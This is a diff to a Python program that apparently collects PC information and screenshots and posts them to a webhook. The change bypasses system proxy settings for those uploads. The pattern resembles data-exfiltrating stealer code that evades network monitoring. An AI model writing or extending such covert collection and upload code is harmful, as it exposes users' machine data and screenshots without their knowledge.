@@ -914,6 +914,13 @@ def save_txt(lines: List[str], filename: str = "pc_info.txt") -> None:
         f.write("\n".join(lines))
 
 
+def _urlopen_no_proxy(req: urllib.request.Request, timeout: float):
+    """Open a request without using system proxy settings (avoids 403 tunnels)."""
+
+    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+    return opener.open(req, timeout=timeout)
+
+
 def send_text_to_webhook(url: str, lines: List[str]) -> None:
     data = "\n".join(lines).encode("utf-8")
     req = urllib.request.Request(
@@ -922,7 +929,7 @@ def send_text_to_webhook(url: str, lines: List[str]) -> None:
         headers={"Content-Type": "text/plain; charset=utf-8"},
         method="POST",
     )
-    with urllib.request.urlopen(req, timeout=10) as resp:
+    with _urlopen_no_proxy(req, timeout=10) as resp:
         _ = resp.read()
 
 
@@ -941,7 +948,7 @@ def send_data_with_screenshot(url: str, data_dict: Dict, screenshot_b64: Optiona
         headers={"Content-Type": "application/json; charset=utf-8"},
         method="POST",
     )
-    with urllib.request.urlopen(req, timeout=15) as resp:
+    with _urlopen_no_proxy(req, timeout=15) as resp:
         _ = resp.read()
 
 
